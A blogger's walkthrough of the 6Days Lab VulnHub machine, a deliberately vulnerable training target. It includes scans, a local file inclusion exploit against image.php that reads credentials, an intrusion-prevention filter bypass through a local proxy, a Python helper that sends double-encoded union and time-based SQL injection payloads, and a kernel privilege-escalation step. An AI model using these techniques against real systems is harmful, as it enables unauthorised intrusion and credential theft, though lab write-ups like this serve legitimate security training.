# 6Days Lab: 1.1
## Intro
This is my walkthrough of the 6days lab vulnhub machine.  You can find this machine at [6Days Lab](https://www.vulnhub.com/entry/6days-lab-11,156/).  If you want to attempt to hack into this machine without spoilers, don't read the rest of this walkthrough.

## Located machine on network
Once the victim machine was booted I performed a quick scan to identify what IP address the new machine received through DHCP.
```
root@sengen-kali:~/vulnhub/6days# nmap 192.168.56.0/24 -sn

Starting Nmap 7.50 ( https://nmap.org ) at 2017-07-27 14:44 PDT

```

## Performed onetwopunch / nmap scans
Using the onetwopunch script which combines unicornscan and nmap I scanned the machine looking for open ports.
```
root@sengen-kali:~/vulnhub/6days# ~/onetwopunch.sh -t target.txt -p all -n "-A -sV"
```
Results indicated the following TCP/UDP ports were found.<br />
[*] TCP ports for nmap to scan: 22,80<br />
[!] No UDP ports found

Quick nmap scan also showed a filtered http-proxy port 8080
```
root@sengen-kali:~/vulnhub/6days# nmap 192.168.56.104

```

<b>So it appears that SSH and a Web port is open</b><br />
Navigated to the webpage and there's a simple page with a promocode textbox and button.

<img src="{{ site.url }}/assets/img/ctf/6days_lab_1.png"/>

Using the code NONEEDFORPENTEST results in a response of:<br />
Code expired!

## Viewing source
- We see that the form submits to a php page called checkpromo.php
- We also see an interesting piece for the broken image on the page
  - \<img src="http://192.168.56.104/image.php?src=https%3A%2f%2f4.bp.blogspot.com%2f-u8Jo4CEKQLk%2fV4OpiaoMJ7I%2fAAAAAAAAAiw%2f8kuCpTOpRWUAdp2p4GpegWdnOwxjwHNYQCLcB%2fs1600%2fphoto.jpg" />

## LFI detected
This image link is rather suspicious as it is being provided as a parameter to another php page call image.php (this often means an LFI or RFI could be possible).

I tried a number of LFI paths in the browser but received errors on the page but then tried them again with curl with success:

```

```
The account andrea at the end is of interest so we'll keep that in mind.

## Searching for other files
The next thing was to see if we could get the other files that were referenced on the site to see what was in them.

checkpromo.php
```
root@sengen-kali:~/vulnhub/6days# curl http://192.168.56.104/image.php?src=../../../../../var/www/checkpromo.php
<?php
include 'config.php';

$conn = mysql_connect($servername, $username, $password);

if (!$conn) {
	die("Connection failed: " . $conn->connect_error);
}

$sql = "SELECT discount, status FROM promocodes WHERE promocode='".$_GET['promocode']."';";

mysql_select_db($dbname);
$result = mysql_query($sql, $conn);

if (!$result) {
	echo "Promocode not valid!";
} else {
	while($row = mysql_fetch_array($result, MYSQL_ASSOC))
	{
		if($row['status'] == 0)
			echo "Code expired!";
		else
			echo "You have %".$row['discount']." discount!";
	}
}

mysql_close($conn);
?>
```
config.php
```
root@sengen-kali:~/vulnhub/6days# curl http://192.168.56.104/image.php?src=../../../../../var/www/config.php
<?php
$servername = "localhost";
$username = "sellingstuff";
$password = "n0_\$\$_n0_g41ns";
$dbname = "fancydb";
```
image.php
```
root@sengen-kali:~/vulnhub/6days# curl http://192.168.56.104/image.php?src=../../../../../var/www/image.php
<?php
$img = $_GET['src'];
header('Content-Type: image/jpeg');
readfile($img);
?>
```

## SQL Injection
So from the above pages I have now gathered, my interest was in the SQL injection that seemed possible through the promocode field.  Although this is where things got a little tricky and not as straight forward as I expected.

The following is the SQL query that I tried to inject into:
```php
$sql = "SELECT discount, status FROM promocodes WHERE promocode='".$_GET['promocode']."';";
```

It seems like this should be an easy injection into this query so I start out with some basic injections to try to get a confirmation.

Starting with a single tick I get an error response with the message:
</i>"Malicious request blocked! ~Rashomon IPS"</i>

I tried a number of of different things such as ```' or 1=1 or 'a'='``` but nothing worked.  I tried url encoding a tick as well (%27) and the result was it getting double url encoded at the destination (%2527)... weird. Not sure what that is about.

I looked through the source again and realized I had not actually grabbed the default page of the site so did that:
```html
root@sengen-kali:~/vulnhub/6days# curl http://192.168.56.104/image.php?src=../../../../../var/www/index.php
<html>
<head>
<title>Rashomon IPS - Main Page</title>
</head>
<body>
<h2>Rashomon Intrusion Prevention System</h2>
<h3>Become immune to every attack!</h3>
Today we're announcing our brand new product, Rashomon IPS! <br />
It's capable of blocking any <b>sophisticated cyber attack</b> which <u>can harm your precious customers.</u> (you don't want THAT to happen, do you?) <br />
<img src="http://<? echo passthru("/sbin/ifconfig | /bin/grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | /bin/grep -Eo '([0-9]*\.){3}[0-9]*' | /bin/grep -v '127.0.0.1' | /usr/bin/tr -d '\n'"); ?>/image.php?src=https%3A%2f%2f4.bp.blogspot.com%2f-u8Jo4CEKQLk%2fV4OpiaoMJ7I%2fAAAAAAAAAiw%2f8kuCpTOpRWUAdp2p4GpegWdnOwxjwHNYQCLcB%2fs1600%2fphoto.jpg" /> <br />
(This guy is coming after your website!) <br />
<br />
Don't waste your time and money by hiring <font color="#ff00cc">pentesters</font> and doing real security audits. <br />
This is the best way to secure your organization and you can completely rely on it, and only it! <br />
<br />
IT'S SO SECURE WE EVEN USE IT ON OUR WEBSITE. <br />
<br />
So be quick and get a <u>%15 discount</u> on our newest product using the promocode <b>NONEEDFORPENTEST</b>. (discount will be available until yesterday)<br />
<br />
<form name="promo" method="GET" action="checkpromo.php">
Apply your promo code here: <input type="text" name="promocode">
<input type="submit" value="Apply Promo">
</form>
</body>
</html>
<?php

?>
```
PHP is using the passthru function that can execute arbitrary commands, however, nothing in this allows for injection from us it seems.

So these sanitizations are happening on my input from the main page but perhaps if I make the same request through the image page it may change. One thing to note is that since the parameter is a URL it needs to be URL encoded and the parameter it has for promocode needs to be URL encoded (so this ends up being double URL encoded).

With this in mind...

The request I want to make is:
```curl http://192.168.56.104/image.php?src=http://127.0.0.1/checkpromo.php?promocode='```

URL encoding the parameter results in:
```
curl http://192.168.56.104/image.php?src=http%3a%2f%2f127.0.0.1%2fcheckpromo.php%3fpromocode%3d%2527
Malicious request blocked!
~Rashomon IPS
```
Same error... blocked.

Knowing about the potential proxy on 8080 that it may be able to use if the request was coming from local I add in the 8080 port to see if that makes a difference.

```
curl http://192.168.56.104/image.php?src=http%3a%2f%2f127.0.0.1%3a8080%2fcheckpromo.php%3fpromocode%3d%2527
Promocode not valid!
```

Success! It works while sending it a single tick which means I may have bypassed the Rashomon IPS filtering.

## Making testing easier through a custom python script
To make things easier to test since all this encoding needs to happen I wrote the below python code to assist in executing commands as I perform some trial and error SQL.

```python
#!/usr/bin/python3

import os
import sys
from urllib.parse import quote_plus

base_url = 'http://192.168.56.104/image.php?src='
proxy_url = quote_plus('http://127.0.0.1:8080/checkpromo.php?promocode=')
attack_string = quote_plus(quote_plus(sys.argv[1])).replace("-", "%252d")

print(base_url + proxy_url + attack_string)

for line in os.popen('curl ' + base_url + proxy_url + attack_string).read().splitlines():
    print(line)
```

This now allows me to make a call like ```./query.py "'"``` which does the proper URL encoding for me.

<b>1% discount</b><br />
With some trial and error I was able to get a 1% discount message as seen below:
```
root@sengen-kali:~/vulnhub/6days# ./query.py "' union select 1,'1"
http://192.168.56.104/image.php?src=http%3A%2F%2F127.0.0.1%3A8080%2Fcheckpromo.php%3Fpromocode%3D%2527%2Bunion%2Bselect%2B1%252C%25271
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    21  100    21    0     0   2966      0 --:--:-- --:--:-- --:--:--  3500
You have %1 discount!
```

<b>0% - Sleep(1)</b><br />
Confirmed through a sleep that I was executing my select here:
```
root@sengen-kali:~/vulnhub/6days# ./query.py "' union select sleep(1),'1"
http://192.168.56.104/image.php?src=http%3A%2F%2F127.0.0.1%3A8080%2Fcheckpromo.php%3Fpromocode%3D%2527%2Bunion%2Bselect%2Bsleep%25281%2529%252C%25271

                                 Dload  Upload   Total   Spent    Left  Speed

You have %0 discount!
```

## Searching for valid tables
Due to the sleep trick I could execute queries to test for valid table names.  If the table name was valid I would get the 1 second sleep, if it was invalid it would return immediately.

In the end, a "users" table was present:
```
root@sengen-kali:~/vulnhub/6days# ./query.py "' union select sleep(1), 1 from users union select 1, '1"
http://192.168.56.104/image.php?src=http%3A%2F%2F127.0.0.1%3A8080%2Fcheckpromo.php%3Fpromocode%3D%2527%2Bunion%2Bselect%2Bsleep%25281%2529%252C%2B1%2Bfrom%2Busers%2Bunion%2Bselect%2B1%252C%2B%25271
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    42  100    42    0     0     41      0  0:00:01  0:00:01 --:--:--    41
You have %0 discount!You have %1 discount!
```

## Finding valid columns and ultimately credentials to an account we saw earlier in the /etc/passwd file
```
root@sengen-kali:~/vulnhub/6days# ./query.py "' union select username, 1 from users union select 1, '1"
http://192.168.56.104/image.php?src=http%3A%2F%2F127.0.0.1%3A8080%2Fcheckpromo.php%3Fpromocode%3D%2527%2Bunion%2Bselect%2Busername%252C%2B1%2Bfrom%2Busers%2Bunion%2Bselect%2B1%252C%2B%25271

```

## SSH
So we now have some credentials (andrea / SayNoToPentests) and we'll give a shot at using them to SSH into the target machine.

<img src="{{ site.url }}/assets/img/ctf/6days_lab_2.png"/>

Success!

But we can't seem to execute commands....

```
andrea@cypm:~$ ifconfig
andrea@cypm:~$ hostname
andrea@cypm:~$ uname -a
andrea@cypm:~$ pwd
andrea@cypm:~$ cd
rbash: cd: restricted
andrea@cypm:~$
```

No commands seem to be working and upon using 'cd' it becomes obvious we are in an rbash shell.

I decided to start with the exact kernel version exploit since this one in particular came up and because it is overlayfs which is a very common vulnerability that I have successfully used on many linux machines.  If it doesn't work I can move on to the others.

<b>Copied the exploit to the system, compiled, and ran it</b>
<img src="{{ site.url }}/assets/img/ctf/6days_lab_5.png"/>

<b>So, on the first exploit pulled down it works...</b>
